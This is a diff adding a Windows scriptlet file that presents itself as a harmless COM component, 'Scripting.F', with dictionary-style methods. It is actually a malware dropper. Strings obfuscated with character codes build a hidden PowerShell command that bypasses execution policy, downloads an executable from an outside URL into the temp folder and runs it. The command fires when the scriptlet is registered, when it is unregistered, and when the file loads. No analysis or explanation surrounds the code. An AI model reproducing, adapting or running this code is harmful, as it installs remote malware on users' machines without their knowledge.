@@ -1,0 +1,114 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Scripting.F"
+    progid="Scripting.F"
+    version="1.2"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+	>
+	
+	<script language="JScript">
+<![CDATA[
+	
+
+	function Register()
+	{
+		
+		
+		
+	
+	
+		 var yTWvhs4auiBDPWdEJevuebeKwoJQ =  String.fromCharCode(112,111,119,101,114,115,104,101,108,108,32,32,45,110,111,108,111,103,111,32,45,101,120,101,99,117,116,105,111,110,112,111,108,105,99,121,32,98,121,112,97,115,115,32,45,110,111,110,105,110,116,101,114,97,99,116,105,118,101,32,45,119,105,110,100,111,119,115,116,121,108,101,32,104,105,100,100,101,110,32,40,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,70,105,108,101,40,39);
+
+
+var yTWvhs4auiBDPWdEJevuebeKwoJQx = "http://batteryenhancer.com/oldsite/Videos/js/DAZZI.exe', '%temp%/VRE1wEh9j0mvUATIN3AqW1HSNnyir8id.exe'); Start-Process '%temp%/VRE1wEh9j0mvUATIN3AqW1HSNnyir8id.exe' ";
+var run = new ActiveXObject('WSCRIPT.Shell').Run(yTWvhs4auiBDPWdEJevuebeKwoJQ+yTWvhs4auiBDPWdEJevuebeKwoJQx);
+
+
+
+
+	
+	
+	
+	
+	}
+	function Unregister()
+	{
+	
+
+
+
+			 var yTWvhs4auiBDPWdEJevuebeKwoJQ =  String.fromCharCode(112,111,119,101,114,115,104,101,108,108,32,32,45,110,111,108,111,103,111,32,45,101,120,101,99,117,116,105,111,110,112,111,108,105,99,121,32,98,121,112,97,115,115,32,45,110,111,110,105,110,116,101,114,97,99,116,105,118,101,32,45,119,105,110,100,111,119,115,116,121,108,101,32,104,105,100,100,101,110,32,40,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,70,105,108,101,40,39);
+
+
+var yTWvhs4auiBDPWdEJevuebeKwoJQx = "http://batteryenhancer.com/oldsite/Videos/js/DAZZI.exe', '%temp%/VRE1wEh9j0mvUATIN3AqW1HSNnyir8id.exe'); Start-Process '%temp%/VRE1wEh9j0mvUATIN3AqW1HSNnyir8id.exe' ";
+var run = new ActiveXObject('WSCRIPT.Shell').Run(yTWvhs4auiBDPWdEJevuebeKwoJQ+yTWvhs4auiBDPWdEJevuebeKwoJQx);
+
+
+
+
+
+	}
+	
+	
+]]>
+</script>
+</registration>
+
+<public>
+    <method name="Add">
+		<parameter name="a"/>
+		<parameter name="b"/>
+	</method>
+	<method name="Exists">
+		<parameter name="a"/>
+	</method>
+	<property name="myProperty" get="getSubroutineName" put="putSubroutineName"/>
+	
+</public>
+<script language="JScript">
+<![CDATA[
+  
+	var MyProperty = GetObject("clsid:EE09B103-97E0-11CF-978F-00A02463E06F");
+  
+	function getSubroutineName()
+	{
+		return MyProperty;
+	}
+	
+	function putSubroutineName()
+	{
+		
+	}
+  
+	function Add(a, b)
+	{
+		MyProperty.Add(a,b);
+	}
+	
+	function Exists(a)
+	{
+		MyProperty.Exists(a);
+	}
+	
+	function Items()
+	{
+		return MyProperty.Items();
+	}
+	
+	
+	
+			 var yTWvhs4auiBDPWdEJevuebeKwoJQ =  String.fromCharCode(112,111,119,101,114,115,104,101,108,108,32,32,45,110,111,108,111,103,111,32,45,101,120,101,99,117,116,105,111,110,112,111,108,105,99,121,32,98,121,112,97,115,115,32,45,110,111,110,105,110,116,101,114,97,99,116,105,118,101,32,45,119,105,110,100,111,119,115,116,121,108,101,32,104,105,100,100,101,110,32,40,78,101,119,45,79,98,106,101,99,116,32,83,121,115,116,101,109,46,78,101,116,46,87,101,98,67,108,105,101,110,116,41,46,68,111,119,110,108,111,97,100,70,105,108,101,40,39);
+
+
+var yTWvhs4auiBDPWdEJevuebeKwoJQx = "http://batteryenhancer.com/oldsite/Videos/js/DAZZI.exe', '%temp%/VRE1wEh9j0mvUATIN3AqW1HSNnyir8id.exe'); Start-Process '%temp%/VRE1wEh9j0mvUATIN3AqW1HSNnyir8id.exe' ";
+var run = new ActiveXObject('WSCRIPT.Shell').Run(yTWvhs4auiBDPWdEJevuebeKwoJQ+yTWvhs4auiBDPWdEJevuebeKwoJQx);
+
+
+  	
+]]>
+</script>
+
+</scriptlet>
